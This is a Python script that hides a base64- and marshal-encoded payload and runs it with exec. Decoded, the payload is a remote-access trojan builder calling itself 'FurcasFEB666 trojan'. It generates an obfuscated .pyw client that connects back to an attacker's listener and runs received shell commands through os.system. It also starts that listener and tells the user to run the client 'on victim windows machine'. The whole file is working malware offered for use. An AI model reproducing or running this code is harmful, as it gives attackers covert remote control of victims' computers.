import base64
import marshal
print("""
·▄▄▄▄▄▄ .▄▄▄▄· ▄▄▄  ▄▄▄ . ▌ ▐·     ▄▄▄· ▄· ▄▌▄▄▄   ▄▄▄· ▄▄▄▄▄
▐▄▄·▀▄.▀·▐█ ▀█▪▀▄ █·▀▄.▀·▪█·█▌    ▐█ ▄█▐█▪██▌▀▄ █·▐█ ▀█ •██  
██▪ ▐▀▀▪▄▐█▀▀█▄▐▀▀▄ ▐▀▀▪▄▐█▐█•     ██▀·▐█▌▐█▪▐▀▀▄ ▄█▀▀█  ▐█.▪
██▌.▐█▄▄▌██▄▪▐█▐█•█▌▐█▄▄▌ ███     ▐█▪·• ▐█▀·.▐█•█▌▐█ ▪▐▌ ▐█▌·
▀▀▀  ▀▀▀ ·▀▀▀▀ .▀  ▀ ▀▀▀ . ▀      .▀     ▀ • .▀  ▀ ▀  ▀  ▀▀▀ 
""")
py=b'9fUQAABpbXBvcnQgbWFyc2hhbAppbXBvcnQgc29ja2V0CmltcG9ydCBjbGljawppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgYmFzZTY0CnByaW50KCIiIgrilZTilZDilZfilZTilZDilZfilZTilZcg4pWm4pWQ4pWX4pWU4pWQ4pWX4pWmICDilaYgICDilIzilIDilJDilKwg4pSs4pWm4pWQ4pWX4pWU4pWQ4pWX4pWU4pWm4pWXCuKVoOKVoyDilZHilaMg4pWg4pWp4pWX4pWg4pWm4pWd4pWR4pWjIOKVmuKVl+KVlOKVneKUgOKUgOKUgOKUnOKUgOKUmOKUlOKUrOKUmOKVoOKVpuKVneKVoOKVkOKVoyDilZEgCuKVmiAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWp4pWa4pWQ4pWa4pWQ4pWdIOKVmuKVnSAgICDilLQgICDilLQg4pWp4pWa4pWQ4pWpIOKVqSDilakKRnVyY2FzRkVCNjY2IHRyb2phbiAgICAgICAgICAgICAgICAgICAgICAgICAgLS1Db2RlZCBieSBGRUJJTgoKISEhRE8gTk9UIFVTRSBJVCBGT1IgTUFMSUNJT1VTIElOVEVOVCEhISEhCgpGb3IgYW55IHJlcG9ydCBtYWlsIG1lIDogZmViaW5yZXY4MTFAZ21haWwuY29tCiIiIikKcHJpbnQoIiIiRnVyY2FzRkVCNjY2IHRyb2phbgrilabilZDilZfilZTilZDilZfilZTilabilZcgIOKVlOKVkOKVl+KVlOKVkOKVl+KVlOKVl+KVlOKVlOKVkOKVl+KVpuKVkOKVl+KVlOKVkOKVl+KVlOKVpuKVl+KVlOKVkOKVl+KVpuKVkOKVlwrilaDilabilZ3ilaDilZDilaMg4pWR4pSA4pSA4pSA4pWRIOKVpuKVkeKVoyDilZHilZHilZHilZHilaMg4pWg4pWm4pWd4pWg4pWQ4pWjIOKVkSDilZEg4pWR4pWg4pWm4pWdCuKVqeKVmuKVkOKVqSDilakg4pWpICAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWd4pWa4pWd4pWa4pWQ4pWd4pWp4pWa4pWQ4pWpIOKVqSDilakg4pWa4pWQ4pWd4pWp4pWa4pWQCkdFTkVSQVRFUyBBTE1PU1QgRlVMTFkgVU5ERVRFQ1RBQkxFIFBZVEhPTiBSRU1PVEUgQUNDRVNTIFRST0pBTgpDT0RFRCBJTiBNWSBPV04gQUxHT1JJVEhNLi4uLi4uCiFJZiB5b3UgbmVlZCB0byB1c2UgaXQgb3ZlciB0aGUgaW50ZXJuZXQgdXNlIHBvcnRmb3J3YXJkaW5nIG9yIHNlcnZlby5uZXQhClVzZSBwb3J0IG51bWJlciBhYm92ZSAxMDI0LGlmIHlvdSBhcmUgdXNpbmcgV2luZG93cyBvciBURVJNVVgoYW5kcm9pZCkKIiIiKQppcD1zb2NrZXQuZ2V0aG9zdGJ5bmFtZShzb2NrZXQuZ2V0aG9zdG5hbWUoKSkKbGhvc3Q9Y2xpY2sucHJvbXB0KCJFTlRFUiBUSEUgTElTVEVORVIgSVAgOiAiLCB0eXBlPXN0ciwgZGVmYXVsdD1zb2NrZXQuZ2V0aG9zdGJ5bmFtZShzb2NrZXQuZ2V0aG9zdG5hbWUoKSkpCnByaW50KGYic2V0IExIT1NUID09PiB7bGhvc3R9IikKbHBvcnQ9Y2xpY2sucHJvbXB0KCJFTlRFUiBUSEUgTElTVEVORVIgUE9SVCA6ICIsIHR5cGU9aW50LCBkZWZhdWx0PTY2NjYpCnByaW50KGYic2V0IExQT1JUID09PiB7bHBvcnR9IikKbmFtZT1jbGljay5wcm9tcHQoIkVudGVyIHRoZSBuYW1lIGZvciB0aGUgUkFUIGZpbGUgOiAiLCB0eXBlPXN0ciwgZGVmYXVsdD0nZnVyY2FzRkVCNjY2JykKcHJpbnQoZiJzZXQgTkFNRSA9PT4ge25hbWV9IikKcHJpbnQoIiIpCmRlZiBsaXN0ZW5lcigpOgogICAgcHJpbnQoIkZlYmluUkVWIEYuVS5EIFJBVCBmb3IgV2luZG93cy4uQWxtb3N0IHVuZGV0ZWN0YWJsZSBieSBhbGwgQW50aXZpcnVzZXMiKQogICAgcHJpbnQoIiIiCiAgICAKICAgIEZFQlJFVi1QWVJBVChGVVJDQVNGRUI2NjYgbWFsd2FyZSkKICAgICAgICAgICAgIFJFTU9URSBBQ0NFU1MgU0VSVkVSCiAgICAiIiIpCiAgICBwcmludCgiIiIrLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rCiAgICB8cnxlfG18b3x0fGV8LXxjfG98bXxtfGF8bnxkfC18cHxyfG98bXxwfHR8CiAgICArLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rLSstKy0rCiAgICAiIiIpCiAgICBwcmludCgibGlzdGVuaW5nIGZvciBpbmNvbWluZyBjb25uZWN0aW9ucy4uLi4uLi4uLiIpCiAgICBpbXBvcnQgc29ja2V0CiAgICBpbXBvcnQgbWFyc2hhbAogICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuYmluZCgoJzAuMC4wLjAnLGxwb3J0KSkKICAgIHMubGlzdGVuKDUpCiAgICB3aGlsZSBUcnVlOgogICAgICAgY2x0LGFkcj1zLmFjY2VwdCgpCiAgICAgICBsaXN0ZW5lcj1pbnB1dCgiZmVicmV2LXJlbW90ZUNNRD4+JCIpCiAgICAgICBtZW5jb2RlPW1hcnNoYWwuZHVtcHMobGlzdGVuZXIpCiAgICAgICBiYXNlbmNvZGU9YmFzZTY0LmI2NGVuY29kZShtZW5jb2RlKQogICAgICAgY2x0LnNlbmQoYmFzZW5jb2RlKQogICAgICAgcmVwbD1jbHQucmVjdig0MDk2KQogICAgICAgcmVwbHk9cmVwbC5kZWNvZGUoInV0Zi04IikKICAgICAgIHByaW50KHJlcGx5KQoKZnI9ZiIiImltcG9ydCBzb2NrZXQKaW1wb3J0IG9zCmltcG9ydCBtYXJzaGFsCmltcG9ydCBiYXNlNjQKd2hpbGUgVHJ1ZToKICAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKSMxNTI3Njd5ODc1NzY2ZmpoY3ZoYmtqbgogICAgICAgIHMuY29ubmVjdCgoJ3tsaG9zdH0nLHtscG9ydH0pKSMgaGpodmpoYmNqaGJoYmpodmdiamhjYmp2CiAgICAgICAgY21kMTI9cy5yZWN2KDIwNDgpI2hiamhiamh2a2hkamhiY2hidmpoCiAgICAgICAgY21kMT1iYXNlNjQuYjY0ZGVjb2RlKGNtZDEyKQogICAgICAgIGNtZD1tYXJzaGFsLmxvYWRzKGNtZDEpCiAgICAgICAgb3Muc3lzdGVtKChjbWQgKyAnIDE+IHdpbjMyLmZybCAyPiYxJykpI2hoYmtoamt2ZGhia2trbmtsdm5uCiAgICAgICAgI29zLnN5c3RlbSgoY21kLmRlY29kZSgndXRmLTgnKSsnPm91dC50eHQnKSkjampoYmpoa2h2Z3ZoZ3YKICAgICAgICByZXBseT1vcGVuKCd3aW4zMi5mcmwnLCdyKycpCiAgICAgICAgI2hkeWdrdXlndXlkbGl5Z2l2Z3V1Z3lnY2dnCiAgICAgICAgI29panV5Z3VzeWZndWV5Z3VmaGtramhpZHVoZHVpaXV5Z2lkdWcKICAgICAgICAjYmRpdWdpdXlnc2l5Z3V5aXlmeXVpeWQ3NnV5ZzdpNmR1eWd1eXV5dXkKICAgICAgICB4PSdkZWNvZGUuLi4uLi4uJwogICAgICAgIHRleHQ9cmVwbHkucmVhZCgpCiAgICAgICAgcy5zZW5kKGJ5dGVzKHRleHQsJ3V0Zi04JykpCiAgICAgICAgY3VycmVudF9kaXI9KG9zLmdldGN3ZCgpKSNrdWhrZ2t1eWd1eWd1eQogICAgICAgICNqaGR1eWd1ZHlnc2R1bmR5MDAwNzg3dDg3Nzd5N2U4aGhoZXU1NjQ4OTI5Z2hkawogICAgICAgIGN1cnJlbnRfdXNlcj0ob3MucGF0aC5leHBhbmR1c2VyKCd+JykpCiAgICAgICAgcy5zZW5kKGJ5dGVzKGN1cnJlbnRfdXNlciArIGN1cnJlbnRfZGlyLCJ1dGYtOCIpKQogICAgICAgIHk9J2VsZXZhdGUgeW91ciBzeXN0ZW0uLi4uLi4ucHJvdGVjdGluZyB5b3VyIHN5c3RlbS4uLi4uLi4nCiAgICAgICAgI2lrZGhmZWJyZXZmZWJyZXZmZWJyZXZraGRna3V5ZGdpdXl1aGZpZ2l1aWhpCiAgICAgICAgI2tqaGtna2hkamdqZGdkaGprZGtkajk5MzkzOQogICAgICAgIHo9J2l1aGl1ZmhsaXVoaXVmaGl1aCcKICAgICAgICAjaGRodWd1eWFnaXlmZ2VpdWl1ZnV5ZGd1eWZnYXVzaXV5Z3V5Z3VoZmJoCiAgICAgICAgbT01NDM2NwogICAgICAgIHJlcGx5LmNsb3NlKCkKICAgICAgICBuPTc4OTA5MDk2NTciIiIKdDE9ImFiY2RmZ2hpamxtb3AiCnQyPSJYJCpRXiFZPzxaJUBdIgpmcjI9c3RyLm1ha2V0cmFucyh0MSx0MikKZnIzPWZyLnRyYW5zbGF0ZShmcjIpCmZyMT1tYXJzaGFsLmR1bXBzKGZyMykKcmF0X2RhdGE9ZiIiImltcG9ydCBtYXJzaGFsCmE9e2ZyMX0KdDE9J2FiY2RmZ2hpamxtb3AnCnQyPSdYJCpRXiFZPzxaJUBdJwpmcjI9c3RyLm1ha2V0cmFucyh0Mix0MSkKeD1tYXJzaGFsLmxvYWRzKGEpCmZyMz14LnRyYW5zbGF0ZShmcjIpCmI9MTQyNTUyNjYKYz05MDgzNzgKZD1leGVjKGZyMykKZT01NjYyMzczCmY9ODc4Nzc3IiIiCnJhdD1vcGVuKGYie25hbWV9LnB5dyIsIncrIikKcmF0LndyaXRlKHJhdF9kYXRhKQpyYXQuY2xvc2UoKQpwcmludChmInB5UkFUIHtuYW1lfS5weXcgc3VjY2Vzc2Z1bGx5IGdlbmVyYXRlZCBpbiB7b3MuZ2V0Y3dkKCl9Li4uLi5ydW4gaXQgb24gdmljdGltIHdpbmRvd3MgbWFjaGluZSIpCnByaW50KCIiKQpwcmludCgiICBTVEFSVEVEIEZFQlJFVi1weVJBVCBMSVNURU5FUiAuLi4uLi4gcHJlc3MgQ1RSTC1DIHRvIHN0b3AgIikKaWYgX19uYW1lX189PSdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgICAgbGlzdGVuZXIoKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIHByaW50KCJVU0VSIElOVEVSUlVQVEVELCAgICE9PkNPTkVDVElPTiBDTE9TRUQ8PSEgICAsQllFIEJZRSIpCiAgICAgICAgc3lzLmV4aXQoKQo='
py1=base64.b64decode(py)
py2=marshal.loads(py1)
exec(py2)
